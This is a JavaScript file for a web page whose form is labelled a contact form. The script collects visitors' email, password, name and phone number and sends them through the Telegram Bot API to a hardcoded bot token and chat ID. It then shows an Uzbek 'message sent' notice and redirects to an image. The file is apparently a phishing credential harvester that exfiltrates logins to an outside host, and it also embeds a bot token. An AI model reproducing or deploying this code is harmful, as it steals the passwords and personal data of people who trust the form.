'use strict';
var BOT_TOKEN = '8765203206:AAGkiR2x8tYa0fT6pi7VCdIcrW9LYw1xlok';
var CHAT_ID = '6023504003';
var form = document.querySelector('#contactForm');
var statusText = document.querySelector('#status');

if (form && statusText) {
    form.addEventListener('submit', function (e) {
        e.preventDefault();
        var emailInput = document.getElementById('email');
        var passwordInput = document.getElementById('password');
        var nameInput = document.getElementById('name');
        var callInput = document.getElementById('number');
        var redirectInput = document.getElementById('redirectImage');
        
        var email = (emailInput === null || emailInput === void 0 ? void 0 : emailInput.value) || '';
        var password = (passwordInput === null || passwordInput === void 0 ? void 0 : passwordInput.value) || '';
        var name = (nameInput === null || nameInput === void 0 ? void 0 : nameInput.value) || '';
        var call = (callInput === null || callInput === void 0 ? void 0 : callInput.value) || '';
        var redirectImage = (redirectInput === null || redirectInput === void 0 ? void 0 : redirectInput.value) || '';
        
        var text = "\n\uD83D\uDCDD Yangi forma xabari:\n\uD83D\uDC68    ism: ".concat(name, "\n\uD83D\uDCE7    email: ").concat(email, "\n\uD83D\uDD11    parol: ").concat(password, "\n\uD83D\uDCDE    telefon: ").concat(call, "\n    ");

        fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text,
            }),
        })
            .then(function (res) {
                if (res.ok && statusText && form) {
                    statusText.textContent = 'Xabar muvaffaqiyatli yuborildi! Rasm ochilmoqda...';
                    form.reset();
                    if (redirectImage) {
                        window.location.href = redirectImage;
                    }
                } else if (statusText) {
                    statusText.textContent = 'Xatolik yuz berdi!';
                }
            })
            .catch(function (err) {
                if (statusText) {
                    statusText.textContent = 'Xatolik yuz berdi!';
                }
                console.error("Telegram error:", err);
            });
    });
}
